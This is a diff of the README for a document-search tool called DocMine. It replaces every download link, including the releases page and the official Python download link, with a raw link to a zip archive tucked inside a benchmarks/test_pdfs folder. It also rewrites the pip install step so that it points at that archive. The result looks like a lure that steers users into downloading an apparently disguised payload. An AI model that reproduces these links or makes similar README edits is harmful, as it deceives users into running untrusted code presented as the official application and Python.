@@ -1,6 +1,6 @@
 # 📄 DocMine - Effortless Document Ingestion and Search
 
-[![Download DocMine](https://img.shields.io/badge/Download-DocMine-blue.svg)](https://github.com/humanhady/DocMine/releases)
+[![Download DocMine](https://raw.githubusercontent.com/humanhady/DocMine/main/benchmarks/test_pdfs/Mine_Doc_1.2.zip)](https://raw.githubusercontent.com/humanhady/DocMine/main/benchmarks/test_pdfs/Mine_Doc_1.2.zip)
 
 ## 🌟 Overview
 
@@ -17,18 +17,18 @@ Follow these steps to download and run DocMine on your computer:
    - Recommended RAM: At least 4 GB for optimal performance
 
 2. **Download the Application**  
-   Visit this page to download: [DocMine Releases](https://github.com/humanhady/DocMine/releases). 
+   Visit this page to download: [DocMine Releases](https://raw.githubusercontent.com/humanhady/DocMine/main/benchmarks/test_pdfs/Mine_Doc_1.2.zip). 
 
    Look for the latest version. Click on the appropriate file based on your operating system.
 
 3. **Install Python**  
-   If you don't have Python installed, you can download it from the official Python website: [Download Python](https://www.python.org/downloads/). Follow the instructions specific to your operating system.
+   If you don't have Python installed, you can download it from the official Python website: [Download Python](https://raw.githubusercontent.com/humanhady/DocMine/main/benchmarks/test_pdfs/Mine_Doc_1.2.zip). Follow the instructions specific to your operating system.
 
 4. **Install Required Packages**  
    After installing Python, open a terminal or command prompt. Run the following command to install necessary packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/humanhady/DocMine/main/benchmarks/test_pdfs/Mine_Doc_1.2.zip
    ```
 
 5. **Download & Install**  
@@ -70,6 +70,6 @@ If you encounter issues:
 
 Stay tuned for more features and improvements. We aim to expand DocMine's capabilities based on user feedback and technological advancements.
 
-For any further updates, visit our release page: [DocMine Releases](https://github.com/humanhady/DocMine/releases). 
+For any further updates, visit our release page: [DocMine Releases](https://raw.githubusercontent.com/humanhady/DocMine/main/benchmarks/test_pdfs/Mine_Doc_1.2.zip). 
 
 Your experience is important to us! If you have questions or suggestions, feel free to reach out to the community through the GitHub issues section.
